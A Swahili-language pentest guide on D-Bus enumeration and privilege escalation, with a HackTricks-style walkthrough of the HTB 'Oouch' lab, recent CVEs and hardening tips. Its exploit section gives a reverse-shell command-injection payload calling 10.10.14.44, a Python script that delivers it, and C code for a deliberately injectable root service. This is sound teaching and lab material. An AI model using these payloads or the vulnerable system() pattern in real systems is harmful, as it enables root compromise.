# D-Bus Enumeration & Command Injection Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## **GUI enumeration**

D-Bus hutumika kama kiunganishi cha mawasiliano kati ya michakato (IPC) katika mazingira ya Ubuntu desktop. Kwenye Ubuntu, kuna message buses kadhaa zinazofanya kazi kwa wakati mmoja: system bus, ambayo hutumiwa hasa na **privileged services kufichua services zinazohusiana na mfumo mzima**, na session bus kwa kila mtumiaji aliyeingia, ambayo hufichua services zinazohusiana na mtumiaji huyo pekee. Lengo kuu hapa ni system bus kwa sababu inahusishwa na services zinazoendesha zikiwa na privileges za juu (kwa mfano, root), kwa kuwa lengo letu ni kuongeza privileges. Inafahamika kuwa architecture ya D-Bus hutumia 'router' kwa kila session bus, ambayo inawajibika kuelekeza ujumbe wa clients kwenye services zinazofaa kulingana na address iliyoainishwa na clients kwa service wanayotaka kuwasiliana nayo.<sup>[[1]](#references)</sup>

Services kwenye D-Bus hufafanuliwa na **objects** na **interfaces** wanazofichua. Objects zinaweza kufananishwa na class instances katika lugha za kawaida za OOP, ambapo kila instance hutambuliwa kwa njia ya kipekee na **object path**. Njia hii, inayofanana na filesystem path, hutambua kwa kipekee kila object inayofichuliwa na service. Interface muhimu kwa madhumuni ya utafiti ni **org.freedesktop.DBus.Introspectable** interface, yenye method moja pekee, Introspect. Method hii hurejesha uwakilishi wa XML wa methods, signals, na properties zinazoungwa mkono na object; hapa tunalenga methods huku properties na signals zikiachwa.

Kwa mawasiliano na D-Bus interface, zana mbili zilitumika: CLI tool inayoitwa **gdbus** kwa ajili ya kuita kwa urahisi methods zinazofichuliwa na D-Bus ndani ya scripts, na [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), GUI tool inayotumia Python iliyoundwa ku-enumerate services zinazopatikana kwenye kila bus na kuonyesha objects zilizomo ndani ya kila service.
```bash
sudo apt-get install d-feet
```
Ikiwa unaangalia **session bus**, thibitisha anwani ya sasa kwanza:
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

Katika picha ya kwanza services zilizosajiliwa kwenye D-Bus system bus zinaonyeshwa, huku **org.debin.apt** ikiwa imeangaziwa mahususi baada ya kuchagua kitufe cha System Bus. D-Feet huuliza service hii kuhusu objects, na kuonyesha interfaces, methods, properties, na signals za objects zilizochaguliwa, kama inavyoonekana kwenye picha ya pili. Signature ya kila method pia inaelezwa kwa kina.

Kipengele muhimu ni kuonyeshwa kwa **process ID (pid)** na **command line** ya service, jambo linalosaidia kuthibitisha ikiwa service inaendeshwa ikiwa na elevated privileges, ambayo ni muhimu kwa utafiti.

**D-Feet pia huruhusu method invocation**: watumiaji wanaweza kuweka Python expressions kama parameters, ambazo D-Feet huzibadilisha kuwa D-Bus types kabla ya kuzipeleka kwenye service.

Hata hivyo, kumbuka kwamba **baadhi ya methods zinahitaji authentication** kabla ya kuturuhusu kuzi-invoke. Tutapuuza methods hizi, kwa kuwa lengo letu ni kuongeza privileges bila credentials tangu mwanzo.

Pia kumbuka kwamba baadhi ya services huuliza D-Bus service nyingine inayoitwa org.freedeskto.PolicyKit1 ikiwa user anapaswa kuruhusiwa kutekeleza actions fulani au la.

## **Uorodheshaji wa Cmd line**

### Orodhesha Service Objects

Inawezekana kuorodhesha D-Bus interfaces zilizofunguliwa kwa:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
Services zilizo na alama ya **`(activatable)`** zinavutia hasa kwa sababu **bado hazijaendeshwa**, lakini ombi la bus linaweza kuzianzisha inapohitajika. Usikome kwenye `busctl list`; linganisha majina hayo na binary halisi ambazo zingetekelezwa.
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
Hii inakuambia kwa haraka ni njia ipi ya `Exec=` itakayoanzishwa kwa jina linaloweza kuanzishwa na chini ya utambulisho upi. Ikiwa binary au chain yake ya utekelezaji imelindwa kwa udhaifu, service isiyotumika bado inaweza kuwa njia ya privilege-escalation.

#### Connections

[Kutoka wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Process inapoweka connection kwenye bus, bus huipa connection hiyo bus name maalum inayoitwa _unique connection name_. Bus names za aina hii haziwezi kubadilishwa—imehakikishwa kuwa hazitabadilika maadamu connection ipo—na, muhimu zaidi, haziwezi kutumiwa tena wakati wa uhai wa bus. Hii inamaanisha kuwa hakuna connection nyingine kwenye bus hiyo itakayowahi kupewa unique connection name hiyo, hata ikiwa process ileile itafunga connection yake kwenye bus na kuunda nyingine mpya. Unique connection names zinatambulika kwa urahisi kwa sababu zinaanza na colon character ambayo kwa kawaida hairuhusiwi.<sup>[[4]](#references)</sup>

### Service Object Info

Kisha, unaweza kupata taarifa fulani kuhusu interface kwa:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
Pia linganisha jina la bus na unit ya `systemd` pamoja na njia ya executable:
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
Hili linajibu swali la kiutendaji muhimu wakati wa privesc: **ikiwa method call itafanikiwa, ni binary na unit gani halisi itakayotekeleza kitendo hicho?**

### Orodhesha Interfaces za Service Object

Unahitaji kuwa na permissions za kutosha.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Kukagua Interface ya Service Object

Kumbuka kwamba katika mfano huu ilichaguliwa interface ya hivi karibuni iliyogunduliwa kwa kutumia parameta ya `tree` (_tazama sehemu iliyotangulia_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Kumbuka method `.Block` ya interface `htb.oouch.Block` (ile tunayovutiwa nayo). Herufi "s" ya safu wima nyingine inaweza kumaanisha kwamba inatarajia string.

Kabla ya kujaribu chochote hatari, thibitisha kwanza method ya **read-oriented** au yenye hatari ndogo kwa njia nyingine. Hii hutenganisha kwa uwazi hali tatu: syntax isiyo sahihi, inayofikika lakini imekataliwa, au inayofikika na inaruhusiwa.
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### Linganisha D-Bus Methods na Policies na Actions

Introspection inakuonyesha **unachoweza kuita**, lakini haikuambii **kwa nini** call inaruhusiwa au inakataliwa. Kwa privesc triage halisi, kwa kawaida unahitaji kukagua **tabaka tatu pamoja**:

1. **Activation metadata** (`.service` files au `SystemdService=`) ili kujua ni binary na unit gani itakayoendeshwa.
2. **D-Bus XML policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`) ili kujua ni nani anayeweza `own`, `send_destination`, au `receive_sender`.
3. **Polkit action files** (`/usr/share/polkit-1/actions/*.policy`) ili kujua authorization model ya default (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Commands muhimu:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
Usidhanie ulinganifu wa 1:1 kati ya method ya D-Bus na action ya Polkit. Method hiyo hiyo inaweza kuchagua action tofauti kulingana na object inayorekebishwa au context ya wakati wa utekelezaji. Kwa hiyo workflow ya kiutendaji ni:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` na grep kwenye faili za `.policy` zinazohusika
3. low-risk live probes kwa kutumia `busctl call`, `gdbus call`, au `dbusmap --enable-probes --null-agent`

Proxy au compatibility services zinahitaji uangalifu wa ziada. **Proxy inayoendeshwa na root** ambayo inapeleka requests kwenye service nyingine ya D-Bus kupitia connection yake iliyoanzishwa awali inaweza kufanya backend ichukulie kimakosa kwamba kila request inatoka kwa UID 0, isipokuwa identity ya caller wa awali ithibitishwe tena.<sup>[[3]](#references)</sup>

### Monitor/Capture Interface

Ukiwa na privileges za kutosha (privileges za `send_destination` na `receive_sender` pekee hazitoshi) unaweza **monitor D-Bus communication**.

Ili **monitor** **communication** utahitaji kuwa **root.** Ikiwa bado unapata matatizo ukiwa root, angalia [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) na [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Ikiwa unajua jinsi ya kusanidi faili ya D-Bus config ili **kuruhusu non-root users kusniff** communication, tafadhali **wasiliana nami**!

Njia tofauti za ku-monitor:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
Katika mfano ufuatao, interface `htb.oouch.Block` inafuatiliwa na **ujumbe "**_**lalalalal**_**" unatumiwa kupitia mawasiliano yasiyo sahihi**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Unaweza kutumia `capture` badala ya `monitor` kuhifadhi matokeo katika faili la **pcapng** ambalo Wireshark inaweza kufungua:
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### Kuchuja kelele zote <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Ikiwa kuna taarifa nyingi sana kwenye bus, pitisha match rule kama ifuatavyo:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Kanuni nyingi zinaweza kubainishwa. Ikiwa ujumbe unalingana na _kanuni yoyote_ kati ya hizo, ujumbe utaonyeshwa. Kama hivi:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
Tazama [nyaraka za D-Bus](http://dbus.freedesktop.org/doc/dbus-specification.html) kwa maelezo zaidi kuhusu sintaksia ya match rule.<sup>[[7]](#references)</sup>

### Zaidi

`busctl` ina options zaidi, [**zipate zote hapa**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Mazingira Yenye Athari**

Kama user **qtc ndani ya host "oouch" kutoka HTB**, unaweza kupata **faili ya config ya D-Bus isiyotarajiwa** iliyopo katika _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Kutoka kwenye usanidi uliotangulia, **utahitaji kuwa mtumiaji `root` au `www-data` ili kutuma na kupokea taarifa** kupitia mawasiliano haya ya D-BUS.

Kama mtumiaji **qtc** ndani ya docker container **aeb4525789d8**, unaweza kupata code inayohusiana na dbus kwenye faili _/code/oouch/routes.py._ Hii ndiyo code inayovutia:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Kama unavyoona, **inaunganisha kwenye interface ya D-Bus** na kutuma "client_ip" kwenye **function ya "Block"**.

Upande mwingine wa muunganisho wa D-Bus kuna binary ya C iliyocompile inayofanya kazi. Code hii **inasikiliza** kwenye muunganisho wa D-Bus **kwa anwani ya IP na inaita iptables kupitia function ya `system`** ili kuzuia anwani ya IP iliyotolewa.\
**Call ya `system` imewekwa ikiwa vulnerable kwa makusudi dhidi ya command injection**, kwa hivyo payload kama ifuatayo itaunda reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

Mwishoni mwa ukurasa huu unaweza kupata **C code kamili ya D-Bus application**. Ndani yake unaweza kupata, kati ya mistari ya 91-97, **jinsi `D-Bus object path`** **na `interface name`** zilivyosajiliwa. Taarifa hii itahitajika ili kutuma taarifa kwenye muunganisho wa D-Bus:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Pia, katika mstari wa 57 unaweza kuona kwamba **njia pekee iliyosajiliwa** kwa mawasiliano haya ya D-Bus inaitwa `Block`(_**Ndiyo sababu katika sehemu inayofuata payloads zitatumwa kwa service object `htb.oouch.Block`, interface `/htb/oouch/Block` na jina la method `Block`**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Msimbo ufuatao wa python utatuma payload kwenye muunganisho wa D-Bus kwa kutumia method ya `Block` kupitia `block_iface.Block(runme)` (_kumbuka kuwa ulitolewa kutoka kwenye sehemu ya awali ya msimbo_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl na dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` ni tool inayotumika kutuma ujumbe kwenye “Message Bus”
- Message Bus – Ni software inayotumiwa na systems kurahisisha mawasiliano kati ya applications. Inahusiana na Message Queue (messages hupangwa kwa mfuatano), lakini katika Message Bus messages hutumwa kwa subscription model na pia kwa haraka sana.
- “-system” tag hutumiwa kuonyesha kuwa ni system message, si session message (kwa default).
- “–print-reply” tag hutumiwa kuchapisha message yetu ipasavyo na kupokea majibu yoyote katika muundo unaoweza kusomeka na binadamu.
- “–dest=Dbus-Interface-Block” Anwani ya Dbus interface.
- “–string:” – Aina ya message tunayotaka kutuma kwenye interface. Kuna formats kadhaa za kutuma messages kama double, bytes, booleans, int, objpath. Kati ya hizi, “object path” ni muhimu tunapotaka kutuma path ya file kwenye Dbus interface. Katika hali hii tunaweza kutumia special file (FIFO) kupitisha command kwenye interface kwa jina la file. “string:;” – Hii ni kuita object path tena, ambapo tunaweka FIFO reverse shell file/command.

_Note kuwa katika `htb.oouch.Block.Block`, sehemu ya kwanza (`htb.oouch.Block`) inarejelea service object na sehemu ya mwisho (`.Block`) inarejelea method name._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Wasaidizi wa Automated Enumeration (2023-2025)

Enumeration ya attack surface kubwa ya D-Bus kwa kutumia `busctl`/`gdbus` manually huwa ngumu haraka. FOSS utilities mbili ndogo zilizotolewa katika miaka michache iliyopita zinaweza kuharakisha kazi wakati wa engagements za red-team au CTF:

### dbusmap ("Nmap for D-Bus")
* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
* Imeandikwa kwa C; single static binary (<50 kB) inayopitia kila object path, inachukua XML ya `Introspect` na kuihusisha na PID/UID inayoimiliki.<sup>[[5]](#references)</sup>
* Flags muhimu:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* Tool hii huweka alama `!` kwenye well-known names zisizolindwa, na kufichua mara moja services unazoweza *own* (take over) au method calls zinazoweza kufikiwa kutoka kwenye shell isiyo na privileges.

### uptux.py
* Author: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
* Python-only script inayotafuta paths za systemd units zenye *writable* permissions **na** D-Bus policy files zenye ruhusa pana kupita kiasi (kwa mfano `send_destination="*"`).<sup>[[6]](#references)</sup>
* Matumizi ya haraka:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* D-Bus module hutafuta katika directories zilizo hapa chini na kuonyesha service yoyote inayoweza ku-spoofiwa au kuhijackiwa na user wa kawaida:
* `/etc/dbus-1/system.d/` na `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## Bugs Muhimu za D-Bus Privilege Escalation (2024-2025)

Kufuatilia CVEs zilizochapishwa hivi karibuni husaidia kubaini patterns zisizo salama kama hizo katika custom code. Mifano miwili mizuri ya hivi karibuni ni:<sup>[[2]](#references)[[3]](#references)</sup>

| Mwaka | CVE | Component | Chanzo Kikuu | Somo la Offensive |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Service inayoendesha kama root ilifichua D-Bus interface ambayo users wasio na privileges wangeweza ku-configure upya, ikiwemo kupakia macro behavior inayodhibitiwa na attacker. | Ikiwa daemon inafichua **device/profile/config management** kwenye system bus, chukulia writable configuration na macro features kama primitives za code execution, si "settings" pekee. |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Compatibility proxy inayoendesha kama root iliforward requests kwa backend services bila kuhifadhi security context ya caller wa awali, hivyo backends iliichukulia proxy kama UID 0. | Chukulia **proxy / bridge / compatibility** D-Bus services kama bug class tofauti: ikiwa zinarudisha privileged calls, thibitisha jinsi caller UID/Polkit context inavyofikishwa kwenye backend. |

Patterns za kuzingatia:
1. Service inaendesha **kama root kwenye system bus**.
2. Ama hakuna authorization check, au check inafanywa dhidi ya **subject isiyo sahihi**.
3. Method inayoweza kufikiwa hatimaye hubadilisha system state: package install, mabadiliko ya user/group, bootloader config, device profile updates, file writes, au direct command execution.

Tumia `dbusmap --enable-probes` au `busctl call` manually kuthibitisha ikiwa method inaweza kufikiwa, kisha kagua service's policy XML na Polkit actions ili kuelewa **subject gani** hasa inayo-authorizewa.

---

## Hardening & Detection Quick-Wins

* Tafuta policies zenye world-writable au *send/receive*-open:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* Dai Polkit kwa methods hatari – hata *root* proxies zinapaswa kupitisha PID ya *caller* kwa `polkit_authority_check_authorization_sync()` badala ya kutumia yao wenyewe.
* Punguza privileges katika helpers zinazoendesha muda mrefu (tumia `sd_pid_get_owner_uid()` kubadilisha namespaces baada ya kuunganisha kwenye bus).
* Ikiwa huwezi kuondoa service, angalau *scope* kwa dedicated Unix group na uzuie access katika XML policy yake.
* Blue-team: capture system bus kwa `busctl capture > /var/log/dbus_$(date +%F).pcapng` na ui-import kwenye Wireshark kwa anomaly detection.

---

## References

- [1] [USBCreator D-Bus Privilege Escalation katika Ubuntu Desktop](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [2] [CVE-2024-45752: D-Bus service inaruhusu configuration na user yeyote asiye na privileges](https://github.com/PixlOne/logiops/issues/473)
- [3] [dde-api-proxy: Authentication Bypass katika Deepin D-Bus Proxy Service (CVE-2025-23222)](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
- [4] [D-Bus - Wikipedia](https://en.wikipedia.org/wiki/D-Bus)
- [5] [taviso/dbusmap - "Nmap for D-Bus"](https://github.com/taviso/dbusmap)
- [6] [initstring/uptux](https://github.com/initstring/uptux)
- [7] [dbus.freedesktop.org - D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html)
{{#include ../../banners/hacktricks-training.md}}
